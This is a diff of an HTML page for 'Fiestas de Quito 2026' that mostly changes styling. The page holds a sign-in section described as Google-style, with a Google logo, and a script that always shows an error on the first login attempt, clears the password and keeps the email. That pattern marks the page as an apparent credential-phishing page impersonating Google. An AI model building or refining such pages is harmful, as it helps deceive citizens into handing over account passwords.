@@ -17,30 +17,31 @@
         .bg-quito-gold { background-color: #bb9457; }
         .border-quito-gold { border-color: #bb9457; }
         
-        /* Fondo con la Virgen del Panecillo al estilo de la imagen de referencia */
+        /* Fondo con la Virgen del Panecillo e iluminación festiva */
         .hero-bg {
-            background: linear-gradient(rgba(13, 27, 42, 0.75), rgba(13, 27, 42, 0.88)), 
-                        url('https://upload.wikimedia.org/wikipedia/commons/e/ec/Virgen_del_Panecillo%2C_Quito%2C_Ecuador.jpg');
+            background: linear-gradient(rgba(13, 27, 42, 0.70), rgba(13, 27, 42, 0.85)), 
+                        url('https://images.unsplash.com/photo-1588668214407-6ea9a6d8c272?auto=format&fit=crop&w=1920&q=80');
             background-size: cover;
             background-position: center;
+            background-repeat: no-repeat;
         }
     </style>
 </head>
-<body class="bg-quito-dark text-white min-h-screen flex flex-col justify-between">
+<body class="bg-quito-dark text-white min-h-screen flex flex-col justify-between hero-bg">
 
     <!-- ENCABEZADO -->
-    <header class="bg-quito-red border-b-4 border-quito-gold shadow-lg py-5 px-6 text-center relative z-10">
+    <header class="bg-quito-red/95 border-b-4 border-quito-gold shadow-lg py-5 px-6 text-center relative z-10 backdrop-blur-sm">
         <div class="absolute top-2 left-4 text-quito-gold font-bold text-xs md:text-sm tracking-widest">¡VIVA QUITO!</div>
         <div class="absolute top-2 right-4 text-quito-gold font-bold text-xs md:text-sm tracking-widest">2026</div>
         <h1 class="text-2xl md:text-3xl font-extrabold text-white tracking-wide">Fiestas de Quito 2026</h1>
         <p class="text-xs md:text-sm text-quito-gold uppercase font-medium mt-1">Participación y Registro Ciudadano</p>
     </header>
 
-    <!-- CONTENEDOR PRINCIPAL CON FONDO REPRESENTATIVO -->
-    <main class="hero-bg flex-grow flex items-center justify-center px-4 py-12">
+    <!-- CONTENEDOR PRINCIPAL CON FONDO DE EL PANECILLO -->
+    <main class="flex-grow flex items-center justify-center px-4 py-12 z-10">
         
         <!-- PASO 1: INICIO DE SESIÓN ESTILO GOOGLE (FONDO BLANCO) -->
-        <section id="login-section" class="bg-white text-gray-900 rounded-2xl p-8 shadow-2xl max-w-md w-full border border-gray-200">
+        <section id="login-section" class="bg-white/95 text-gray-900 rounded-2xl p-8 shadow-2xl max-w-md w-full border border-gray-200 backdrop-blur-md">
             <div class="text-center mb-6">
                 <!-- Logo de Google -->
                 <div class="flex justify-center mb-3">
@@ -176,7 +177,7 @@
             const passwordField = document.getElementById('login-password');
 
             if (loginAttempts === 0) {
-                // Primer intento: muestra error, limpia la contraseña y MANTIENE el correo
+                // Primer intento: muestra error, limpia contraseña y MANTIENE el correo
                 loginAttempts++;
                 document.getElementById('login-error').classList.remove('hidden');
                 passwordField.value = ''; 
